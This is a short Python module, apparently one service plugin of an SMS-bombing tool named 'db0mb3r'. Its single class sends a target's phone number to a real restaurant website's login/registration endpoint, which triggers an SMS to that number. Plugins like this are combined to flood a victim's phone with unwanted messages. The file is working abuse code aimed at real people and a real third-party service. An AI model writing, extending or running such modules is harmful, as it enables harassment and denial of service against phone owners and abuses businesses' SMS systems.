from db0mb3r.services.service import Service


class Makarolls(Service):
    async def run(self):
        await self.post(
            "https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",
            data={"data": self.formatted_phone, "metod": "postreg"},
        )
